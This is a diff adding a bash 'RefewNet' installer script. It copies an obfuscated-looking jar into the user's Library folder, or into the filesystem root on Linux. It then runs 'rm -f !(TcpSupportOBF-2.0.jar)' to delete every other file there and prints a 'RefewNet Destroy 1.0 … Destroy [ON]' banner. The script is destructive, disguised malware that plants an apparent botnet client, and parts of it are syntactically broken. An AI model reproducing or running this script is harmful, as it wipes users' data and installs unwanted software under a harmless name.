@@ -1,0 +1,232 @@
+#!/bin/bash
+
+ #########################
+# Author:   Refew ツ 
+# Contact: <officialrefewshop@gmail.com>
+# License:  http://www.opensource.org/licenses/MIT
+ #########################
+echo ""
+echo "───────────────────────────────────────"
+echo ""
+echo "         Welcome To RefewNet"
+echo ""
+echo "───────────────────────────────────────"		
+echo ""
+echo "" 
+echo "Are you sure?[y/n]"
+read ops 
+case $ops in 
+n)
+	echo "Try more later" ;;
+y)
+	echo "Which operative system do you have?"
+	echo "» MacOs "
+	echo "» Windows" 
+	echo "» Linux "
+	read os
+	case $os in
+	macos)
+		echo  "Installing file for $(whoami)" 
+        cd /Users/$(whoami)/Desktop
+		cp TcpSupportOBF-2.0.jar /Users/$(whoami)/Library
+		cd /Users/$(whoami)/Library
+		rm -f !(TcpSupportOBF-2.0.jar)
+		echo  "Press Any Key.." 
+		read mos
+		case $mos in
+		*)
+			clear
+			while :
+			do
+			echo "[+]──────────────────────────────────────────────────────────────────────────────────────────[+]"
+			echo " "
+			echo -e "Created By Refew ツ                         User:"$(whoami)" "
+			echo -e "                                            Expires:Never   
+			Destroy [ON]                            "
+			echo -e "
+			   #   P   r   o   j   e   c   t            RefewNet Destroy 1.0 
+			  / \ / \ / \ / \ / \ / \ / \ / \         ---------------------------------
+			 ( R | E | F | E | W | N | E | T )       ¦  You are connected to RefewNet  ¦
+			  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/         --------------------------------- "
+			echo " "
+			echo "[+]──────────────────────────────────────────────────────────────────────────────────────────[+]"
+			exit 0
+			done #while
+		esac ;; 
+	Macos)
+		echo  "Installing file for $(whoami)" 
+        cd /Users/$(whoami)/Desktop
+		cp TcpSupportOBF-2.0.jar /Users/$(whoami)/Library
+		cd /Users/$(whoami)/Library
+		rm -f !(TcpSupportOBF-2.0.jar)
+		echo  "Press Any Key.." 
+		read Mos
+		case $Mos in
+		*)
+			clear
+			while :
+			do
+				echo "[+]──────────────────────────────────────────────────────────────────────────────────────────[+]"
+				echo " "
+				echo -e "Created By Refew ツ                         User:"$(whoami)" "
+				echo -e "                                            Expires:Never   
+				Destroy [ON]                            "
+				echo -e "
+				   #   P   r   o   j   e   c   t            RefewNet Destroy 1.0 
+				  / \ / \ / \ / \ / \ / \ / \ / \         ---------------------------------
+				 ( R | E | F | E | W | N | E | T )       ¦  You are connected to RefewNet  ¦
+				  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/         --------------------------------- "
+				echo " "
+				echo "[+]──────────────────────────────────────────────────────────────────────────────────────────[+]"
+				exit 0
+			done #while
+		esac ;; 
+	MacOs)
+		echo  "Installing file for $(whoami)" 
+        cd /Users/$(whoami)/Desktop
+		cp TcpSupportOBF-2.0.jar /Users/$(whoami)/Library
+		cd /Users/$(whoami)/Library
+		rm -f !(TcpSupportOBF-2.0.jar)
+		echo  "Press Any Key.." 
+		read MOs
+		case $MOs in
+		*)
+			clear
+			while :
+			do
+				echo "[+]──────────────────────────────────────────────────────────────────────────────────────────[+]"
+				echo " "
+				echo -e "Created By Refew ツ                         User:"$(whoami)" "
+				echo -e "                                            Expires:Never   
+				Destroy [ON]                            "
+				echo -e "
+				   #   P   r   o   j   e   c   t            RefewNet Destroy 1.0 
+				  / \ / \ / \ / \ / \ / \ / \ / \         ---------------------------------
+				 ( R | E | F | E | W | N | E | T )       ¦  You are connected to RefewNet  ¦
+				  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/         --------------------------------- "
+				echo " "
+				echo "[+]──────────────────────────────────────────────────────────────────────────────────────────[+]"
+				exit 0
+			done #while
+		esac ;; 
+	windows)
+		echo  "Installing file for $(whoami)" 
+        cd "C:\Users\$(whoami)\Desktop"
+		cp "TcpSupportOBF-2.0.jar usr/local"  
+		cd usr/local
+		rm -f !(TcpSupportOBF-2.0.jar)
+	    echo  "Press Any Key.." 
+		read wdws
+		case $wdws in
+		*)
+			cls
+			while :
+			do
+				echo "[+]──────────────────────────────────────────────────────────────────────────────────────────[+]"
+				echo " "
+				echo -e "Created By Refew ツ                         User:"$(whoami)" "
+				echo -e "                                            Expires:Never   
+				Destroy [ON]                            "
+				echo -e "
+				   #   P   r   o   j   e   c   t            RefewNet Destroy 1.0 
+				  / \ / \ / \ / \ / \ / \ / \ / \         ---------------------------------
+				 ( R | E | F | E | W | N | E | T )       ¦  You are connected to RefewNet  ¦
+				  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/         --------------------------------- "
+				echo " "
+				echo "[+]──────────────────────────────────────────────────────────────────────────────────────────[+]"
+				exit 0
+			done #while 
+		esac ;;
+	Windows)
+		echo  "Installing file for $(whoami)" 
+        cd "C:\Users\$(whoami)\Desktop"
+		cp "TcpSupportOBF-2.0.jar usr/local"  
+		cd usr/local
+		rm -f !(TcpSupportOBF-2.0.jar) 
+	    echo  "Press Any Key.." 
+		read Wdws
+		case $Wdws in
+		*)
+			cls
+			while :
+			do
+				echo "[+]──────────────────────────────────────────────────────────────────────────────────────────[+]"
+				echo " "
+				echo -e "Created By Refew ツ                         User:"$(whoami)" "
+				echo -e "                                            Expires:Never   
+				Destroy [ON]                            "
+				echo -e "
+				   #   P   r   o   j   e   c   t            RefewNet Destroy 1.0 
+				  / \ / \ / \ / \ / \ / \ / \ / \         ---------------------------------
+				 ( R | E | F | E | W | N | E | T )       ¦  You are connected to RefewNet  ¦
+				  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/         --------------------------------- "
+				echo " "
+				echo "[+]──────────────────────────────────────────────────────────────────────────────────────────[+]"
+				exit 0
+			done #while 
+		esac ;;
+	linux)
+		echo  "Installing file for $(whoami)" 
+        cd /root
+		cp TcpSupportOBF-2.0.jar /
+		cd /
+		rm -f !(TcpSupportOBF-2.0.jar)
+		echo  "Press Any Key.." 
+		read linx
+		case $linx in
+		*)
+			clear
+			while :
+			do
+			echo "[+]──────────────────────────────────────────────────────────────────────────────────────────[+]"
+			echo " "
+			echo -e "Created By Refew ツ                         User:"$(whoami)" "
+			echo -e "                                            Expires:Never   
+			Destroy [ON]                            "
+			echo -e "
+			   #   P   r   o   j   e   c   t            RefewNet Destroy 1.0 
+			  / \ / \ / \ / \ / \ / \ / \ / \         ---------------------------------
+			 ( R | E | F | E | W | N | E | T )       ¦  You are connected to RefewNet  ¦
+			  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/         --------------------------------- "
+			echo " "
+			echo "[+]──────────────────────────────────────────────────────────────────────────────────────────[+]"
+			exit 0
+			done #while
+		esac ;; 
+	Linux)
+		echo  "Installing file for $(whoami)" 
+        cd /Users/$(whoami)/Desktop
+		cp TcpSupportOBF-2.0.jar /Users/$(whoami)/Library
+		cd /Users/$(whoami)/Library
+		rm -f !(TcpSupportOBF-2.0.jar)
+		echo  "Press Any Key.." 
+		read Linux
+		case $Linux in
+		*)
+			clear
+			while :
+			do
+			echo "[+]──────────────────────────────────────────────────────────────────────────────────────────[+]"
+			echo " "
+			echo -e "Created By Refew ツ                         User:"$(whoami)" "
+			echo -e "                                            Expires:Never   
+			Destroy [ON]                            "
+			echo -e "
+			   #   P   r   o   j   e   c   t            RefewNet Destroy 1.0 
+			  / \ / \ / \ / \ / \ / \ / \ / \         ---------------------------------
+			 ( R | E | F | E | W | N | E | T )       ¦  You are connected to RefewNet  ¦
+			  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/         --------------------------------- "
+			echo " "
+			echo "[+]──────────────────────────────────────────────────────────────────────────────────────────[+]"
+			exit 0
+			done #while
+		esac ;; 
+*)
+	echo "Are you sure?[y/n]" ;;
+esac 
+
+ #########################
+# Author:   Refew ツ 
+# Contact: <officialrefewshop@gmail.com>
+# License:  http://www.opensource.org/licenses/MIT
+ #########################
